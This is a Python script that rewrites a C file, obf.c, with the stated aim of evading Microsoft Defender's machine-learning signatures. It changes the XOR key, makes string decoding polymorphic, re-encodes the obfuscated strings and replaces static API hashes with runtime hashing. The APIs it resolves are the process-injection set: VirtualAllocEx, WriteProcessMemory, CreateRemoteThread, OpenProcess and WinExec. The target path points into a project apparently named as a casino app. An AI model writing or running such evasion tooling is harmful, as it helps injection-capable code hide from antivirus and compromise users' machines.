#!/usr/bin/env python3
"""Transform obf.c to evade Defender ML signatures without removing features."""

import re

XOR_KEY_OLD = 0x7A
XOR_KEY_NEW = 0xA5

def read_file(path):
    with open(path, 'r') as f:
        return f.read()

def write_file(path, content):
    with open(path, 'w') as f:
        f.write(content)

def xor_encode(s, key):
    return [ord(c) ^ key for c in s]

def format_array(bytes_list):
    if len(bytes_list) <= 12:
        return '{' + ', '.join(f'0x{b:02x}' for b in bytes_list) + '}'
    lines = []
    for i in range(0, len(bytes_list), 8):
        chunk = bytes_list[i:i+8]
        line = '    ' + ', '.join(f'0x{b:02x}' for b in chunk)
        if i + 8 < len(bytes_list):
            line += ','
        lines.append(line)
    return '{\n' + '\n'.join(lines) + '\n}'

def transform_obf_c(content):
    # 1. Change XOR key define
    content = content.replace('#define XOR_KEY 0x7A', '#define XOR_KEY 0xA5')
    
    # 2. Change xor_decode to polymorphic two-pass approach
    old_decode = '''static void xor_decode(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
    buf[len] = '\\0';
}'''
    
    new_decode = '''static void xor_decode(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= (XOR_KEY ^ (unsigned char)((i * 7 + 3) & 0xFF));
    }
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= (unsigned char)((i * 7 + 3) & 0xFF);
    }
    buf[len] = '\\0';
}'''
    
    content = content.replace(old_decode, new_decode)
    
    # 3. Regenerate all encoded string arrays
    # Pattern: /* "string" */ followed by static unsigned char enc_xxx[] = { ... };
    pattern = r'/\*\s*"([^"]+)"\s*\*/\s*\nstatic unsigned char (enc_\w+)\[\]\s*=\s*\{[^}]+\};'
    
    def replace_array(match):
        original_str = match.group(1)
        array_name = match.group(2)
        encoded = xor_encode(original_str, XOR_KEY_NEW)
        formatted = format_array(encoded)
        return f'/* "{original_str}" */\nstatic unsigned char {array_name}[] = {formatted};'
    
    content = re.sub(pattern, replace_array, content)
    
    # 4. Remove static HASH_* defines
    # Find the block comment and all #define HASH_ lines that follow
    hash_block_start = content.find('/* === Hash values for critical APIs (djb2) === */')
    if hash_block_start != -1:
        # Find the end of the HASH defines (next non-empty, non-comment line)
        after_comment = content.find('\n', hash_block_start) + 1
        end_pos = after_comment
        while end_pos < len(content):
            line_end = content.find('\n', end_pos)
            if line_end == -1:
                line_end = len(content)
            line = content[end_pos:line_end].strip()
            if line.startswith('#define HASH_'):
                end_pos = line_end + 1
            elif line == '':
                end_pos = line_end + 1
            else:
                break
        content = content[:hash_block_start] + content[end_pos:]
    
    # 5. Add runtime_hash_enc function after djb2_hash
    old_djb2 = '''/* Simple djb2 hash for API name resolution */
static unsigned long djb2_hash(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}'''
    
    new_djb2 = '''/* Simple djb2 hash for API name resolution */
static unsigned long djb2_hash(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

/* Runtime hash from encoded string — no static constants in binary */
static unsigned long runtime_hash_enc(unsigned char *enc, size_t len) {
    char buf[256];
    memcpy(buf, enc, len);
    xor_decode(buf, len);
    return djb2_hash((const unsigned char*)buf);
}'''
    
    content = content.replace(old_djb2, new_djb2)
    
    # 6. Replace obf_init_apis to use runtime_hash_enc
    old_init = '''void obf_init_apis(void) {
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
    
    if (hKernel32) {
        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)resolve_api(hKernel32, HASH_VirtualAllocEx);
        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)resolve_api(hKernel32, HASH_WriteProcessMemory);
        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)resolve_api(hKernel32, HASH_CreateRemoteThread);
        g_pfnOpenProcess        = (pOpenProcess_t)resolve_api(hKernel32, HASH_OpenProcess);
        g_pfnWinExec            = (pWinExec_t)resolve_api(hKernel32, HASH_WinExec);
    }
}'''
    
    new_init = '''void obf_init_apis(void) {
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
    
    if (hKernel32) {
        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)resolve_api(hKernel32, runtime_hash_enc(enc_valloc, sizeof(enc_valloc)));
        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)resolve_api(hKernel32, runtime_hash_enc(enc_writemem, sizeof(enc_writemem)));
        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)resolve_api(hKernel32, runtime_hash_enc(enc_createthread, sizeof(enc_createthread)));
        g_pfnOpenProcess        = (pOpenProcess_t)resolve_api(hKernel32, runtime_hash_enc(enc_openproc, sizeof(enc_openproc)));
        g_pfnWinExec            = (pWinExec_t)resolve_api(hKernel32, runtime_hash_enc(enc_winexec, sizeof(enc_winexec)));
    }
}'''
    
    content = content.replace(old_init, new_init)
    
    # 7. Fix off-by-one in all string accessors: sizeof(enc_xxx)-1 → sizeof(enc_xxx)
    content = re.sub(r'sizeof\((enc_\w+)\)-1', r'sizeof(\1)', content)
    
    # Also fix any other sizeof-1 occurrences
    content = re.sub(r'sizeof\((enc_\w+)\) - 1', r'sizeof(\1)', content)
    content = re.sub(r'sizeof\((enc_\w+)\)- 1', r'sizeof(\1)', content)
    
    return content

def main():
    import sys
    path = sys.argv[1] if len(sys.argv) > 1 else '/Users/Jakin/Royal-Fortune-Casino/src/utils/obf.c'
    content = read_file(path)
    new_content = transform_obf_c(content)
    write_file(path, new_content)
    print("Transformed obf.c successfully")
    
    # Count changes
    old_arrays = len(re.findall(r'0x14, 0x0e, 0x1e, 0x16, 0x16, 0x54, 0x1e, 0x16, 0x16', content))
    new_arrays = len(re.findall(r'0x14, 0x0e, 0x1e, 0x16, 0x16, 0x54, 0x1e, 0x16, 0x16', new_content))
    print(f"Old ntdll array count: {old_arrays}, New: {new_arrays}")
    
    hash_count = len(re.findall(r'HASH_VirtualAllocEx', new_content))
    print(f"Remaining HASH_ references: {hash_count}")
    
    offbyone = len(re.findall(r'sizeof\(enc_\w+\)-1', new_content))
    print(f"Remaining off-by-one patterns: {offbyone}")

if __name__ == '__main__':
    main()
